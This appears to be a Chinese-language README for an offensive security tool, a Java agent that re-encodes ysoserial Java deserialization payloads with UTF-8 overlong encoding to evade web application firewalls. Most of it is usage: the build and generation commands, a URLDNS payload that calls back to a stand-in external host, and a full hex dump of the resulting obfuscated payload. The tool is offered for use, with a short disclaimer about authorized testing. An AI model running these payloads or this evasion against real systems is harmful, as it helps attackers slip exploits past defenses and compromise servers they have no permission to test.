# UTF8 Overlong WAF Bypass Hook
本项目是对 先知 上发布的 [UTF-8 Overlong Encoding](https://xz.aliyun.com/t/14300) 绕过 WAF (Web Application Firewall) 技术的研究的实现。通过 Java 反序列化利用 Java Agent 技术来实现 UTF-8 Overlong Encoding，从而可能绕过某些 WAF 的防护。


## 使用方法
### 编译
```sh
mvn clean package -Dmaven.test.skip=true
```
这将编译项目并生成必要的 JAR 文件，同时跳过测试。
### 使用

1. 使用 Java Agent 生成 payload：
```sh
java -jar -javaagent:/path/to/UTF8_Agent-1.0-SNAPSHOT.jar ysoserial-0.0.6-SNAPSHOT-all_frohoff.jar URLDNS http://4.example.com > utf8_obf_urldns.bin
```

请确保将 `/path/to/UTF8_Agent-1.0-SNAPSHOT.jar` 替换为实际的 Java Agent 文件路径。

2. 查看生成的 payload：
```sh
xxd -c 42 ./utf8_obf_urldns.bin

00000000: aced 0005 7372 0033 e081 aae0 81a1 e081 b6e0 81a1 e080 aee0 81b5 e081 b4e0 81a9 e081 ace0 80ae e081 88e0  ....sr.3..................................
0000002a: 81a1 e081 b3e0 81a8 e081 8de0 81a1 e081 b005 07da c1c3 1660 d103 0002 4600 1ee0 81ac e081 afe0 81a1 e081  .......................`....F.............
00000054: a4e0 8186 e081 a1e0 81a3 e081 b4e0 81af e081 b249 001b e081 b4e0 81a8 e081 b2e0 81a5 e081 b3e0 81a8 e081  ...................I......................
0000007e: afe0 81ac e081 a478 703f 4000 0000 0000 0c77 0800 0000 1000 0000 0173 7200 24e0 81aa e081 a1e0 81b6 e081  .......xp?@......w.........sr.$...........
000000a8: a1e0 80ae e081 aee0 81a5 e081 b4e0 80ae e081 95e0 8192 e081 8c96 2537 361a fce4 7203 0007 4900 18e0 81a8  ..........................%76...r...I.....
000000d2: e081 a1e0 81b3 e081 a8e0 8183 e081 afe0 81a4 e081 a549 000c e081 b0e0 81af e081 b2e0 81b4 4c00 1be0 81a1  .....................I..............L.....
000000fc: e081 b5e0 81b4 e081 a8e0 81af e081 b2e0 81a9 e081 b4e0 81b9 7400 36e0 818c e081 aae0 81a1 e081 b6e0 81a1  ........................t.6...............
00000126: e080 afe0 81ac e081 a1e0 81ae e081 a7e0 80af e081 93e0 81b4 e081 b2e0 81a9 e081 aee0 81a7 e080 bb4c 000c  .......................................L..
00000150: e081 a6e0 81a9 e081 ace0 81a5 7100 7e00 034c 000c e081 a8e0 81af e081 b3e0 81b4 7100 7e00 034c 0018 e081  ............q.~..L..............q.~..L....
0000017a: b0e0 81b2 e081 afe0 81b4 e081 afe0 81a3 e081 afe0 81ac 7100 7e00 034c 0009 e081 b2e0 81a5 e081 a671 007e  ......................q.~..L...........q.~
000001a4: 0003 7870 ffff ffff ffff ffff 7400 27e0 80b4 e080 aee0 81a5 e081 b8e0 81a1 e081 ade0 81b0 e081 ace0 81a5  ..xp........t.'...........................
000001ce: e080 aee0 81a3 e081 afe0 81ad 7400 0071 007e 0005 7400 0ce0 81a8 e081 b4e0 81b4 e081 b070 7874 003c e081  ............t..q.~..t..............pxt.<..
000001f8: a8e0 81b4 e081 b4e0 81b0 e080 bae0 80af e080 afe0 80b4 e080 aee0 81a5 e081 b8e0 81a1 e081 ade0 81b0 e081  ..........................................
00000222: ace0 81a5 e080 aee0 81a3 e081 afe0 81ad 78       
```
这将以十六进制格式显示 payload 内容。

### 注意事项
- 本工具旨在帮助安全研究者和开发人员了解和防范 Java 反序列化漏洞，不应用于非法目的。
- 使用本工具可能对目标系统造成影响，请确保在授权的环境中使用。

## 贡献
欢迎贡献代码和改进建议！请通过 GitHub 的 Pull Requests 功能提交您的贡献。

## 许可证
本项目采用 [Apache License 2.0](LICENSE) 许可证。